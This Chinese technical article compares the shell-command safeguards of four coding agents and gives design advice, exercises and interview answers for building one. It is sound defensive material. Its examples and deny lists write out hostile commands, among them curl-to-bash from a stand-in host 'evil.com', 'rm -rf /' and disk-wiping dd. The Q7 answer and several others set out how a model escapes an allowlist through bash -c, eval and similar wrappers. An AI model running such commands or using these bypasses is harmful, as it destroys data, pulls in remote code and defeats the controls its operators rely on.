+  alt="四家 Shell 系统在 默认安全度 加 日常使用流畅度 两条轴上的位置"
+  caption="Claude Code 和 OpenClaw 守着右下（最严但每条命令都要审），Codex 居中（规则可 diff），Hermes 走顶部（命令层放行加环境层隔离换流畅度）。"
+/>
+
+「shell 防护做多严」这件事的分歧本质上是「你的 agent 在什么场景跑」的差异。从场景反推选型，四种取舍各对应一类典型部署。
+
+**个人开发者用 agent 做日常编码，最痛的是每条命令都被审批弹窗打断**。Hermes 的 `TERMINAL_ENV=docker` 路线最舒服：日常的 ls、grep、cat、git 这些全过不打断，真要跑高危命令时容器里跑炸了不影响 host，体感最流畅。代价是命令层的细粒度审计能力弱（要看具体跑了什么命令得查容器日志）。
+
+**企业部署 agent 给员工用，安全合规要求每条命令都可审计**。OpenClaw 的 `security=allowlist` 加 per-binary safe-bin profile 是必须的：每条命令的每个 flag 都有 binary 级别的边界，GNU long flag 缩写也会被还原检测，反 obfuscation 最强。代价是 safe-bin profile 维护成本高（每加一个新工具都要写一份 profile），员工的日常体验也最受打扰（每条 allowlist 之外的命令都要审批）。
+
+**把 agent 接入 CI、自动化系统，规则需要 git 化跟版本控制**。Codex 的 .codexpolicy Starlark DSL 最合适：规则可以放在 git 仓库里 review、可以 diff、可以加 CI 验证（match、not_match 自带单测会 fail-fast）、可以让安全团队独立迭代（不用改 agent 代码）。代价是 Starlark 学习曲线对运维有门槛（不是所有人都熟悉 Bazel 风格的脚本语言）、需要专人维护规则集。
+
+**做跨 IDE、跨平台的开发者工具，用户量大且背景各异**。Claude Code 的 23 项检查加 tree-sitter 双解析加 sandbox-by-default 加 permission mode 是默认安全度最高的方案：bash、zsh 的所有已知注入 trick 都有专门检查器，新用户不需要做任何配置就能得到合理的默认安全。代价是每条命令多跑一遍 tree-sitter 跟 23 项检查的开销（轻量命令延迟变高 5-20ms），且 23 项检查的维护成本主要落在 Anthropic 团队身上（社区贡献新规则的门槛较高）。
+
+## §6 · 我的点评
+
+<ScoreCard
+  rows={[
+    { system: 'Codex', value: '★★★★★', reason: 'execpolicy Starlark DSL 加 match、not_match 自带单测加 justification 给用户看加 sandbox 二层互补。规则可 git 化、可 lint、可 diff', risk: '规则维护需要人写，社区规则集还不丰富。Starlark 学习曲线对运维有门槛' },
+    { system: 'Claude Code', value: '★★★★★', reason: '23 项 ID 化检查加 tree-sitter 双解析加 zsh 模块特判加 sandbox-by-default 加区分「用户便利」和「安全边界」', risk: '解析开销大。excludedCommands 不是安全边界但容易被理解成边界。改 sandbox 行为要改 SandboxManager' },
+    { system: 'OpenClaw', value: '★★★★★', reason: 'security 乘以 ask 二维矩阵加 safe-bin profile per binary 加 GNU long-flag 缩写还原加 shell wrapper 在 allowlist 模式直接 deny', risk: 'safe-bin profile 维护成本高。用户初次配置要理解 9 种组合' },
+    { system: 'Hermes', value: '★★★★', reason: 'TERMINAL_ENV 7 种后端覆盖几乎所有隔离需求。workdir allowlist 反元字符。审批回调跨 IM 平台', risk: '命令层挡截较弱，依赖容器、沙箱兜底。切后端要管 7 种环境的依赖。本地模式下没 sandbox 默认开' },
+  ]}
+  caption="评分依据：默认安全度加工程可维护加审批体验加跨场景适配"
+  headers={['系统', '评分', '亮点', '风险']}
+/>
+
+## §7 · 自己实现 Shell 执行系统的最佳实践
+
+下面是从四家提炼的「自己写 shell 执行加命令审查」配方。先用 allowlist 起步，再加生产级特性，最后避开四个常见死路。
+
+<BuildRecipe
+  title="复刻方案"
+  minimal={[
+    '从 allowlist 起步：维护一份 safe-cmd.txt，工具调用前 shlex 分词加首 token（即命令名）比对。allowlist 比 denylist 安全得多（denylist 永远落后于新攻击模式），先把 ls、cat、grep、git status 等常用安全命令加进去',
+    '所有非 allowlist 命令走 approval prompt 不要直接 deny。直接 deny 太刚性（用户合法需求都被卡住），让用户参与决策（看到命令是什么、决定是否允许）才是 coding agent 的最佳体验',
+    'workdir 用 allowlist 字符正则校验（参考 Hermes 的 _WORKDIR_SAFE_RE）。防止 cd ../../etc 这种路径穿越。只允许字母、数字、`_-./` 等安全字符，发现奇怪字符就拒绝',
+    'shell wrapper（sh -c、bash -c、cmd /c）默认进审批。这些 wrapper 让模型可以构造任意命令（绕过 allowlist 检查），必须人工审批确认意图',
+  ]}
+  advanced={[
+    '把策略提取成独立 DSL（参考 Codex execpolicy Starlark）。规则可 git diff、可 review、可 CI 自动测试。规则跟代码分离让安全审计更容易',
+    '每条规则带 match、not_match 自带单测，加载时全跑一遍。错的规则启动就崩（fail fast），避免「运行了一周才发现某条规则是错的」',
+    'shell 解析用 tree-sitter（参考 Claude Code）。能识别 here-doc、command substitution、redirection 等复杂结构。正则解析对这些结构经常出错（漏判、误判都很严重）',
+    '加 per-binary flag 白名单、黑名单（参考 OpenClaw 的 safe-bin profile）。同一个命令不同 flag 风险天差地别（git status 安全、git push --force 危险），细到 flag 级别才能精确控制',
+    '高危场景换执行后端（参考 Hermes）。docker、firecracker、cloud sandbox 兜底。高危命令（如 build、test 跑用户代码）跑在隔离环境里，逃逸了也只是污染容器不是污染主机',
+    '所有 sec check 给数字 ID（参考 Claude Code 的 23 个 ID-tagged checks）。日志里只记 ID 不记原始命令。这样既能追溯（哪个 check 拦的），又不泄漏命令细节给日志收集系统',
+  ]}
+  avoid={[
+    '别只靠 deny-list。每次新发现 trick 都得加规则，永远落后于攻击面。attacker 总能想出新的 bypass（curl pipe bash 的 N 种变种、base64 编码命令、shell 字符串拼接等）',
+    '别让 sandbox 当唯一防线。bubblewrap、seatbelt、docker 都有逃逸 CVE 历史。需要 defense in depth（多层防御），命令级审查加 sandbox 加审计日志缺一不可',
+    '别在 prompt 里教模型「不要 rm -rf」。模型听话率不为 100%（特别是 jailbreak 后），任何依赖模型自律的安全设计都不可靠。安全必须在工具层挡',
+    '别把 excludedCommands 这种便利特性当安全边界（Claude Code 的源码注释明说这一点）。这些是「用户体验」特性（避免烦人的批准弹窗），不是安全边界（attacker 可以构造命令绕过）',
+  ]}
+/>
+
+## §8 · 四家 pipeline 命运图
+
+<Diagram
+  src="/diagrams/07-pipelines.svg"
+  alt="一条 git push --force 在四家 Shell pipeline 里的命运"
+  caption="同一条命令，四家挡的位置完全不重叠：Codex 在 DSL 决策、Claude Code 在 bash 解析、OpenClaw 在矩阵加 binary profile、Hermes 在执行环境层。"
+/>
+
+四家拦的地方完全不重叠。Codex 把决策外置成 DSL，Claude Code 在解析层穷举攻击模式，OpenClaw 走二维矩阵加 binary 级别约束，Hermes 把整个执行环境换掉。要做自己的 shell 拦截系统，可以挑两到三层组合。
+
+## §9 · 延伸阅读 · 源码入口
+
+<SourceTrail
+  title="延伸阅读 · 源码入口"
+  entries={[
+    { system: 'Codex', path: 'REF/codex/codex-rs/execpolicy/src/policy.rs', lines: '34-260', desc: 'Policy struct、prefix rule 匹配、network rule、host_executable 解析' },
+    { system: 'Codex', path: 'REF/codex/codex-rs/execpolicy/src/decision.rs', lines: '1-28', desc: 'Allow、Prompt、Forbidden 三档' },
+    { system: 'Codex', path: 'REF/codex/codex-rs/execpolicy/examples/example.codexpolicy', desc: 'Starlark 规则示例，每条带 match、not_match 单测' },
+    { system: 'Codex', path: 'REF/codex/codex-rs/execpolicy/README.md', desc: 'execpolicy 整体设计与 CLI 用法' },
+    { system: 'Claude Code', path: 'REF/claude-code-2.1.88-expanded/src/tools/BashTool/bashSecurity.ts', lines: '1-130', desc: '23 项安全检查加 ZSH_DANGEROUS_COMMANDS 加命令替换 pattern 表' },
+    { system: 'Claude Code', path: 'REF/claude-code-2.1.88-expanded/src/tools/BashTool/shouldUseSandbox.ts', lines: '1-153', desc: 'sandbox-by-default 决策加 excludedCommands 的「便利非边界」注释' },
+    { system: 'Claude Code', path: 'REF/claude-code-2.1.88-expanded/src/tools/BashTool/bashPermissionRule.ts', desc: 'prefix、exact、wildcard 三种 rule 类型' },
+    { system: 'OpenClaw', path: 'REF/openclaw/src/infra/exec-approvals.ts', lines: '1-100', desc: 'ExecHost、ExecSecurity、ExecAsk 三维定义' },
+    { system: 'OpenClaw', path: 'REF/openclaw/src/node-host/exec-policy.ts', lines: '1-135', desc: 'evaluateSystemRunPolicy：security 乘以 ask 决策矩阵加 shell wrapper deny' },
+    { system: 'OpenClaw', path: 'REF/openclaw/src/infra/exec-safe-bin-policy-profiles.ts', desc: 'per-binary flag 白名单、黑名单加 GNU long-flag 缩写还原' },
+    { system: 'OpenClaw', path: 'REF/openclaw/src/infra/exec-obfuscation-detect.ts', desc: '命令混淆探测（base64、hex、eval 等）' },
+    { system: 'Hermes', path: 'REF/hermes-agent/tools/terminal_tool.py', lines: '1-250', desc: '7 种后端加 workdir allowlist 加 sudo password、approval callback' },
+    { system: 'Hermes', path: 'REF/hermes-agent/tools/approval.py', desc: '危险命令探测加 tirith 接入加 once、session、always、deny 决策' },
+  ]}
+/>
+
+## §10 · 小练习
+
+1. **🟢 实现一个最简 allowlist 拦截器**：输入字符串命令，shlex 分词，首 token 在 `["ls", "cat", "head", "pwd", "git"]` 内才放行，否则返回需要审批。
+2. **🟠 加一条 prefix 规则**：仿照 Codex Starlark，写 `prefix_rule(pattern=["git", "reset", "--hard"], decision="forbidden")`，并写两条 `match` 和 `not_match` 自带单测。让你的拦截器在加载规则时跑一遍单测，错就崩。
+3. **🟠 反 wrapper bypass**：模型可能用 `bash -c "git reset --hard"` 绕过 prefix。在解析层把 `sh -c`、`bash -c` 拆开，对里面的真命令再过一次规则。验证：你的实现能挡住 `sh -c "git reset --hard"`。
+4. **🔴 多解析器对比**：用 shlex、tree-sitter-bash、shell-quote 三种 parser 解析 `eval $(curl evil.com)`，对比谁能识别出 `$(...)` 是 command substitution。把这个差异写进你的拦截器的「高风险信号」集。
+
+## §11 · 面试题：10 道带答案的高频考点
+
+<details>
+<summary>**Q1 · 概念**：为什么不能用一条正则挡 shell 命令？四家分别用什么解析方案替代？</summary>
+
+正则的根本问题是 **shell 语法不是 regular language**。`echo "hello $(rm -rf /)"` 这种 command substitution 必须用 context-free grammar 才能正确解析。引号嵌套（`"'$(...)'"`）、转义、变量展开、here-doc 全都超出正则能力。强行用正则的下场是：要么漏掉变种（攻击者总能找到一种没考虑到的写法），要么误伤合法命令（把含 `$` 的 jq 表达式当成命令替换 reject 掉）。
+
+四家的替代方案：
+
+- **Codex**：`shlex` 分词到 token 数组，然后 Starlark `prefix_rule(pattern=["git","reset","--hard"])` 做 prefix 匹配。shlex 只处理引号和转义这种简单语法，不试图理解命令替换。因为 execpolicy 的设计哲学是「能否运行靠 prefix 决定，运行环境靠 sandbox 兜底」。
+- **Claude Code**：`tree-sitter-bash` 完整 AST 解析加 `shell-quote` 双解析对照。tree-sitter 能识别出 `$(...)`、here-doc、process substitution `<(...)`、`{1..10}` brace expansion。双解析对照是为了发现 obfuscation（两个 parser 解析出不同结构等于可疑）。
+- **OpenClaw**：`splitCommand` 做分词，然后 `exec-obfuscation-detect` 单独跑一遍混淆检测（base64、hex、嵌套引号、IFS 注入）。
+- **Hermes**：彻底放弃命令层语法挡截，改在 `workdir` 用字符 allowlist 正则。命令本体的危险性交给 `tirith` 探测器加 container 隔离。
+
+实战建议：**自己实现至少用 shlex 加单独的 wrapper detector**（识别 `sh -c`、`bash -c`、`eval` 这三个最容易绕过的东西）。tree-sitter 是好东西但调试和性能开销大，agent 量级一般够呛。
+
+**源码**：`claude-code/src/tools/BashTool/bashSecurity.ts:76-101`（23 项 ID 列表）。[`codex/codex-rs/execpolicy/src/policy.rs:34-260`](https://github.com/openai/codex/blob/f27cf9db0974d344d78e7e0b47e7c812776b1395/codex-rs/execpolicy/src/policy.rs#L34-L260)。
+
+**追问**：「shlex 不解析命令替换，那 Codex 怎么挡 `bash -c "rm -rf /"`？」答：Codex 的 `prefix_rule(pattern=["bash","-c"], decision="prompt")` 直接把 `bash -c` 升到 Prompt，让用户在审批弹窗里看到完整命令再决定。换句话说，Codex 不试图解析 wrapper 里面是什么，直接对 wrapper 本身收紧。
+</details>
+
+<details>
+<summary>**Q2 · 架构**：为什么 Claude Code 的 23 项安全检查用数字 ID 而不是字符串 key？</summary>
+
+源码注释写得很直白：**用数字而不是字符串记日志，避免 PII 泄漏**。
+
+举个例子：用户跑了一条 `cat /Users/john/secret-keys.txt | base64`。Claude Code 命中 `#10 DANGEROUS_PATTERNS_OUTPUT_REDIRECTION`。如果日志里写 "blocked check string='DANGEROUS_PATTERNS_OUTPUT_REDIRECTION on cat /Users/john/secret-keys.txt'"，日志本身就泄漏了用户文件名和路径。改成 "blocked check_id=10"，日志里只有数字，命令本体走另一条 redacted 通道，可以单独脱敏或不记。
+
+这个设计延伸出三条工程纪律：
+
+1. **风险检测 ID 化，日志只记 ID**。便于在 audit 系统里 join，也便于事故复盘时按 ID 聚合。
+2. **检测描述（什么样的命令会触发 #10）只在文档、源码里，不在 prompt 给模型**。让模型知道 23 项 ID 反而是攻击面：模型读了文档就知道怎么绕过。
+3. **ID 编号一旦发布就不能改语义**。新加检查就用新 ID，不要复用旧编号。Claude Code 内部维护了 `BASH_SECURITY_CHECK_IDS` 的 ID-to-meaning 文档但不外泄。
+
+类似设计：Linux kernel 用 errno 数字而不是字符串。HTTP 状态码 404 而不是 NotFound。都是「便于聚合加避免泄漏」的工程产物。
+
+**源码**：`claude-code/src/tools/BashTool/bashSecurity.ts:76-101`（23 项 ID 定义）加同文件 line 1-50 的注释解释 ID 化策略。
+
+**追问**：「为什么不让 Codex 也 ID 化 execpolicy 决策？」答：Codex 的 `Allow、Prompt、Forbidden` 只有 3 个枚举，没有 23 项那么细。而且 Codex 的 `justification` 字段反而需要明文给用户看（为什么拦你加替代命令建议）。两种设计取向不冲突：粒度细等于 ID 化。粒度粗等于明文。
+</details>
+
+<details>
+<summary>**Q3 · 工程**：`shouldUseSandbox()` 注释里说「excludedCommands 是便利特性，不是安全边界」。这句话的工程意义是什么？</summary>
+
+这是 Claude Code 源码里我最欣赏的一行注释。它把 **「便利特性」（convenience feature）** 和 **「安全边界」（security boundary）** 明确区分。
+
+具体场景：用户嫌每次跑 `ls` 都进 sandbox 太慢，于是在 `~/.claude/settings.json` 里加 `sandbox.excludedCommands: ["ls", "cat", "head"]`。这些命令以后不进 sandbox 直接跑。问题来了：万一攻击者构造一条恶意 `ls --color=auto -la $(curl evil.com)`，模型可能识别为「首 token 是 ls」然后整条放行，绕过了 sandbox。
+
+正确的工程划分：
+
+- **excludedCommands** 等于便利特性。**目的**：减少 sandbox 启动开销让 ls、cat、grep 跑得快。**前提**：用户已经自己把这些命令的 argv 危险性想清楚了。**不承诺**：会挡住攻击者用 ls 发起的攻击。
+- **真正的安全边界** 等于 sandbox 加 permission prompt。**目的**：即使模型被骗，也不让 host 文件系统被破坏。**前提**：每条命令的 argv 都不可信。**承诺**：通过的命令在 sandbox 里能造成的破坏被限制在 sandbox 范围内。
+
+这个区分对 agent 系统很重要，因为 agent 系统里有大量「为了让用户体验好」的开关：跳过审批、缓存权限、白名单某个工具。**每个开关都必须标清楚**：这是便利还是边界。混淆的代价是真出事故时找不到责任人：「我以为这是边界呢」。
+
+实战做法：
+
+1. 在 settings.json 里给所有「便利」开关加 `_comment: "convenience, not a security boundary"` 字段。
+2. 文档里专门写一节「什么是 Claude Code 的真正安全边界」：只有 sandbox 加 prompt 两层。
+3. 代码注释里在每个看似安全的检查上面写明它的边界级别。
+
+**源码**：`claude-code/src/tools/BashTool/shouldUseSandbox.ts:130-153` 加该文件 line 1-30 的开篇注释。
+
+**追问**：「OpenClaw 的 allowlist 是边界还是便利？」答：OpenClaw 的 allowlist 在源码注释里写明是边界（deny-by-default unless allowlisted）。判别方法：**看默认行为是 deny 还是 allow**。默认 deny 等于边界（不在名单里就拒）。默认 allow 等于便利（不在名单里也跑，只是慢一点）。
+</details>
+
+<details>
+<summary>**Q4 · 概念**：Codex 的 execpolicy 决策为什么是 `Allow、Prompt、Forbidden` 三档而不是 boolean？</summary>
+
+Boolean（允许、拒绝）的设计在 agent 场景下不够用，根因是 **「拒绝」有两种语义**：
+
+1. **强拒**：永远不跑，无论用户怎么说。比如 `rm -rf /` 这种，给个 prompt 让用户确认也不安全（用户可能误点）。
+2. **软拒**：默认不跑，但用户可以在审批环节翻盘。比如 `cp file1 file2` 这种，看场景：在生产机器上拷敏感文件要拦，在自己 dev 机器上则可以放行。
+
+Codex 的三档对应：
+
+- `Allow`：直接放行，无需审批。例如 `ls`、`pwd`。
+- `Prompt`：弹审批，用户决定。例如 `cp`、`mv`、`git checkout -b`。这是绝大多数命令的归宿。
+- `Forbidden`：永远拦，审批都不弹。例如 `rm -rf /`、`dd if=/dev/zero of=/dev/sda`。
+
+为什么不直接拿掉 `Forbidden`，让所有「危险」命令都走 prompt？因为：
+
+1. **审批疲劳**：用户在 IDE 里被弹 100 次 `cp` 后会麻木，看到 `rm -rf /` 也手贱点 yes。`Forbidden` 是给「无论什么场景都不应该跑」的命令准备的逃生通道。
+2. **CI、无人值守模式**：`approval_policy="never"` 时（CI、batch），`Prompt` 自动拒绝，但 `Forbidden` 提供更清晰的语义：「这不是因为没人审批拒绝的，是规则上就不允许」。
+3. **strictest match wins**：一条命令命中多条规则时，`Forbidden` 大于 `Prompt` 大于 `Allow`。这让规则可以叠加，无需互斥。
+
+另外 Codex 还有第四档语义但不在 enum 里：**没规则命中等于默认 Prompt**。这一档是 fallback。
+
+**源码**：[`codex/codex-rs/execpolicy/src/decision.rs:1-28`](https://github.com/openai/codex/blob/f27cf9db0974d344d78e7e0b47e7c812776b1395/codex-rs/execpolicy/src/decision.rs#L1-L28)（三档定义加注释解释 `approval_policy="never"` 的行为）。
+
+**追问**：「Claude Code 的决策也是三档吗？」答：Claude Code 是 `allow、deny` 加 `进沙箱、不进沙箱` 的二维。语义比 Codex 更细但也更复杂：「allow + sandbox」是放行但保护，「allow + no sandbox」是裸跑。Codex 用三档加单独的 sandbox_mode 字段，结构更清晰但表达力略差。
+</details>
+
+<details>
+<summary>**Q5 · 概念**：Hermes 用 allowlist 字符正则 `^[A-Za-z0-9/\\:_\-.~ +@=,]+$` 校验 workdir。为什么是 allowlist 而非 deny-list？</summary>
+
+源码注释直白：「deny-list 永远会被新冒出来的 metacharacter 绕过」。
+
+具体场景：你给 deny-list 加了 `$`（防命令替换）、`;`（防命令分隔）、`&&`（防命令链）、`` ` ``（防反引号）、`|`（防 pipe）。看起来很全？攻击者用：
+
+- `$IFS$()cmd` （IFS 注入）
+- 控制字符 `\x01cmd`
+- Unicode 空白（U+00A0, U+2007）当分隔符
+- shell 特有的 brace expansion `{a,b}`
+- glob `*` 通配
+- here-doc `<<EOF`
+- 注释 `#` 把后面截断
+
+每发现一种新绕过，deny-list 加一条。永远落后于攻击面。
+
+Allowlist 反过来：「只有 `[A-Za-z0-9/\\:_\-.~ +@=,]` 这些字符能出现」。这是一个**白名单字符表**，新攻击向量天然不在表里。代价是用户写中文路径、emoji 路径之类的小众场景会被误伤，但 workdir 99% 是 `/home/user/projects/foo`、`C:\Users\...\foo` 这种，覆盖足够。
+
+工程哲学：**默认拒绝（default deny）加显式允许（explicit allow）**。整个 shell 安全设计都应该这样：
+
+1. 默认拒绝所有命令，只允许 allowlist 里的。
+2. 默认拒绝所有 flag，只允许 safe-bin profile 里的。
+3. 默认拒绝所有字符，只允许 allowlist 正则匹配的。
+4. 默认进 sandbox，只有 `excludedCommands` 里的不进。
+
+每一层都是 default deny。即使某一层挂了（漏放过一个 metacharacter），后面还有几层挡。这就是 **defense in depth**。
+
+**源码**：[`hermes-agent/tools/terminal_tool.py:150-177`](https://github.com/NousResearch/hermes-agent/blob/2d59afd3da04812583ecbbf3be83539678a947c4/tools/terminal_tool.py#L150-L177)（`_WORKDIR_SAFE_RE` 定义加注释解释 allowlist 对比 deny-list）。
+
+**追问**：「allowlist 一定比 deny-list 安全吗？」答：不一定。allowlist 的弱点是**误伤合法用法**：用户有合理需求（比如 workdir 路径里有 `(` 或 `=`），但 allowlist 默认不放。这时候要么扩 allowlist（再 audit 一次），要么走「用户白名单覆盖默认」机制。绝对安全是不存在的，allowlist 只是把「被绕过」风险换成「被误伤」风险，后者影响范围可控。
+</details>
+
+<details>
+<summary>**Q6 · 实战**：你要给自己的 agent 加 shell 拦截，从零开始第一步该做什么？</summary>
+
+**第一步永远是 allowlist**。不要从一开始就上 DSL、tree-sitter、sandbox 那些重武器。
+
+具体步骤：
+
+**Day 1**：写一份 `safe-cmd.txt`，里面只有最常用的只读命令：`ls`、`cat`、`head`、`tail`、`pwd`、`grep`、`find`、`git status`、`git diff`、`git log`。工具调用前 shlex 分词，首 token 在文件里就放行，否则 prompt 审批。
+
+```python
+import shlex
+
+ALLOWLIST = set(open("safe-cmd.txt").read().split())
+
+def check(cmd: str) -> tuple[str, str]:
+    """returns (decision, reason)"""
+    try:
+        tokens = shlex.split(cmd)
+    except ValueError as e:
+        return "prompt", f"unparseable shell: {e}"
+    if not tokens:
+        return "prompt", "empty command"
+    if tokens[0] in ALLOWLIST:
+        return "allow", ""
+    return "prompt", f"first token '{tokens[0]}' not in allowlist"
+```
+
+**Day 2**：加 wrapper detection。在 allowlist 检查前先看是不是 `sh -c`、`bash -c`、`zsh -c`、`eval` 这四个。如果是，把里面的真命令拆出来再走一次 check。这是绕过 allowlist 的最常见 trick。
+
+**Day 3**：加 workdir 校验。参考 Hermes 的字符 allowlist 正则。
+
+**Day 4**：加 hard deny 名单。哪怕 prompt 也不弹的命令：`rm -rf /`、`dd if=`、`mkfs.`、`> /dev/sda`。这一档对应 Codex 的 `Forbidden`。
+
+**Day 5**：把 prompt 接口实现起来。CLI 用 `inquirer.confirm`，IDE 用 vscode API，gateway 用 IM 平台 callback。
+
+**第二周**才考虑：
+
+- DSL 提取（Codex execpolicy 风格）：规则文件加单测
+- tree-sitter（Claude Code 风格）：每条命令 AST 解析
+- safe-bin profile（OpenClaw 风格）：per-binary flag 白名单
+- sandbox（所有四家）：bubblewrap、sandbox-exec、docker
+
+为什么不要从第一天就上重武器？因为：
+
+1. **不知道用户实际跑什么**。先用 allowlist 加全部 prompt 观察一周，看用户实际命令分布，再决定哪些常用命令要进 allowlist。
+2. **审批成本最大**。先把审批通道做顺（CLI prompt 也行），后面加挡截才有出口。
+3. **大部分场景不需要 DSL**。除非你有 100 加条规则要 git diff，否则一段 if-else 就够。
+
+**源码参考**：从最简到最复杂的实现梯度：Hermes `terminal_tool.py:150-200`（最简 allowlist）走 Codex `execpolicy/src/policy.rs:34-260`（DSL 进阶）走 Claude Code `BashTool/bashSecurity.ts:1-300`（穷举 23 项）。
+
+**追问**：「allowlist 太严，模型每次都被 prompt 怎么办？」答：观察 prompt 日志，把高频且安全的命令分批加进 allowlist。这个过程类似 RBAC 的 role 调优：allowlist 不是一次性写完的，是迭代加出来的。
+</details>
+
+<details>
+<summary>**Q7 · 架构**：OpenClaw 为什么要在 allowlist 模式下专门 deny 掉 `sh -c`、`bash -c`？</summary>
+
+因为 **shell wrapper 是 allowlist 的最经典 bypass**。
+
+具体绕过路径：
+
+1. 用户配置 `security=allowlist`，allowlist 里有 `["git", "ls", "cat"]`。
+2. 模型想跑 `rm -rf .git`，但 `rm` 不在 allowlist，会被拒。
+3. 模型改写：`bash -c "rm -rf .git"`。如果 allowlist 里有 `bash`（很多人会加，因为某些工具脚本需要），首 token 检查就放行。
+4. `bash -c` 后面的字符串绕过了 allowlist 的逐 binary 校验。`rm -rf .git` 在 bash 子进程里成功执行。
+
+OpenClaw 的 `evaluateSystemRunPolicy` 直接在 `security=allowlist` 模式下把 shell wrapper 标记为 `shellWrapperBlocked = true`，无论 wrapper 本身是否在 allowlist。这把 bypass 通道彻底堵死。
+
+延伸：**所有元命令都得特判**。Wrapper 不止 `sh -c`：
+
+- `eval "..."`：动态求值字符串
+- `exec ...`：替换当前进程
+- `env CMD=... target`：通过环境变量传递攻击 payload（虽然不是 wrapper，但同样隐藏真实意图）
+- `xargs cmd ...`：从 stdin 读命令
+- `find ... -exec cmd {}`：在 find 里嵌入 exec
+- `awk 'BEGIN{system("cmd")}'`：awk 的 system 调用
+- `perl -e 'system("cmd")'`：perl 的 system
+
+OpenClaw 在 `exec-obfuscation-detect.ts` 里覆盖了这些主要 case。
+
+工程纪律：**任何能从字符串构造命令的程序，本身就是 wrapper**。allowlist 模式默认 deny 所有这类元命令。如果用户需要 `find -exec`，得在 UI 里显式开 case-by-case 审批。
+
+类似设计：
+
+- Codex execpolicy 把 `bash`、`sh`、`zsh` 默认归 `Prompt`，靠用户在审批弹窗里看完整字符串再决定。
+- Claude Code 的 23 项检查里 `#5 SHELL_METACHARACTERS` 会捕捉到 wrapper 调用，进入额外校验。
+- Hermes 用 `tirith` 危险命令探测器扫 wrapper 调用模式。
+
+**源码**：[`openclaw/src/node-host/exec-policy.ts:52-90`](https://github.com/openclaw/openclaw/blob/f6d0712f508b1f926ad6fc42f7d07b1a60e62730/src/node-host/exec-policy.ts#L52-L90)（`shellWrapperBlocked` 判定加 Windows `cmd /c` 特判）。
+
+**追问**：「那我自己的 agent 能不能彻底禁用 wrapper？」答：理论上可以但实际不行。很多合法工具脚本（Makefile、CI、CD 配置、package.json scripts）都需要 `sh -c`。可行做法：默认 prompt 弹窗、UI 显示完整 wrapper 内容加推荐「如果可能，请直接调用 git 而不是 bash -c 'git ...'」。
+</details>
+
+<details>
+<summary>**Q8 · 工程**：Hermes 7 种 TERMINAL_ENV 后端的代价是什么？为什么其他三家不做？</summary>
+
+Hermes 的 7 种后端：`local、docker、modal、ssh、singularity、daytona、managed-modal`。代价很高：
+
+1. **每种后端的依赖管理不同**：docker 需要 `docker.sock`，modal 需要 modal Python SDK 加 API key，ssh 需要 paramiko 加凭证，singularity 需要二进制安装，daytona 需要 SDK。光是 `requirements.txt` 就臃肿。
+2. **每种后端的 spawn 协议不同**：local 是 `subprocess.Popen`，docker 是 `client.containers.run`，modal 是 `Image.from_dockerfile + sb.exec`，ssh 是 `client.exec_command`。要在 `terminal_tool.py` 里封一个统一接口，每加一种后端要重新写 spawn、log streaming、cleanup 逻辑。
+3. **每种后端的错误模式不同**：local 出错是 `OSError`，docker 出错是 `docker.errors.APIError`，modal 出错是 `modal.exception.Error`。要统一成 agent 能理解的 error。
+4. **每种后端的资源生命周期不同**：local 进程随 agent 退出，docker container 需要显式 `--rm`，modal sandbox 有 idle timeout，ssh 连接要保持。Hermes 在 `terminal_tool.py` 末尾有 200 加行做 lifecycle 管理。
+5. **冷启动开销不同**：local 是 ms 级，docker 是秒级，modal 是分钟级（第一次镜像构建）。用户切后端要重新培养使用直觉。
+
+为什么其他三家不做？
+
+- **Codex** 定位 CLI、CI，sandbox 在 Linux Landlock 加 macOS seatbelt 已经够用。container 这一层让用户自己包：他们提供 `codex --sandbox-mode workspace-write` 加 `docker run codex ...`。
+- **Claude Code** 定位 IDE 插件，本质在用户机器上跑，sandbox 用 sandbox-exec、bubblewrap 就够。container 这层不在他们职责范围。
+- **OpenClaw** 定位 agent 平台，把「执行后端」抽象成 `ExecHost: sandbox、gateway、node` 三档，但具体每个 host 怎么实现交给用户。OpenClaw 自己不做 docker、modal 集成。
+
+为什么 Hermes 做？**因为 Hermes 是 Nous Research 的研究平台**。他们要在不同实验里测同一个 agent 在不同执行环境下的行为（如果跑在 modal cloud sandbox 里会不会更安全），所以必须把后端做成可切换的。这是研究需求驱动的工程债。
+
+实战教训：**如果你的 agent 不是研究平台，不要学 Hermes**。99% 的 agent 只需要 local 加一种容器后端（docker 或 firecracker）就够。多后端的工程债远大于收益。
+
+**源码**：[`hermes-agent/tools/terminal_tool.py:1-250`](https://github.com/NousResearch/hermes-agent/blob/2d59afd3da04812583ecbbf3be83539678a947c4/tools/terminal_tool.py#L1-L250)（7 种后端的 `_get_terminal_runner` dispatch）。
+
+**追问**：「那 Hermes 的 managed-modal 是什么？」答：Modal 提供了一种 managed gateway 模式，agent 不直连 modal API 而是通过 Hermes 内部 gateway 中转。好处：API key 管理集中、用量计费集中、降级策略集中。Hermes 把这种模式单独编号，方便企业用户接 SSO 加计费系统。
+</details>
+
+<details>
+<summary>**Q9 · 实战**：你接手一个已有 agent 项目，shell 拦截层几乎为零。如何分阶段加防御？</summary>
+
+按 **defense in depth** 的思路分四阶段，每阶段验证有效再进下一阶段。
+
+**第 1 阶段（1-2 周）· 可见性优先**
+
+不加拦截，先加日志。所有 shell 命令落 audit log：时间戳、模型 turn、原始 argv、cwd、user、role、exit code、stdout、stderr 大小。这一步的目的是**摸清现状**：模型实际跑哪些命令、哪些命令出错、哪些命令是用户自己也不愿意跑的。
+
+输出：一份「过去 7 天 top-100 命令分布」报告。
+
+**第 2 阶段（2-3 周）· allowlist 加 prompt**
+
+基于第 1 阶段的报告，把高频安全命令放 allowlist：`ls`、`cat`、`head`、`pwd`、`grep`、`find`、`git status`、`git diff`、`git log`、`node`、`npm test`。其他全部 prompt。Prompt 通道先用 CLI confirm 实现，IDE、IM 通道后面再上。
+
+预期：用户会抱怨 prompt 太多。**这是正确的反馈**：把抱怨整理出来，决定下一步加哪些命令进 allowlist。
+
+**第 3 阶段（2-3 周）· 危险命令 hard deny**
+
+从第 1 阶段日志里挑出「出现过但不应该出现」的命令：`rm -rf /`、`chmod -R 777 /`、`> /dev/sda`、`curl evil.com | bash`。建一份 `deny.txt`，这些命令永远拦，prompt 都不弹。这一档对应 Codex 的 `Forbidden`。
+
+同时加 wrapper detection：`sh -c`、`bash -c`、`eval`、`curl ... | bash`。
+
+预期：能挡住 99% 的事故，剩 1% 是 0day 攻击或 obfuscation。
+
+**第 4 阶段（4-6 周）· sandbox**
+
+到这一步用户对 shell 拦截已经有清晰预期，是时候上 sandbox 了。Linux 用 bubblewrap，macOS 用 sandbox-exec，Windows 用 AppContainer。把 agent 进程整体放沙箱里。
+
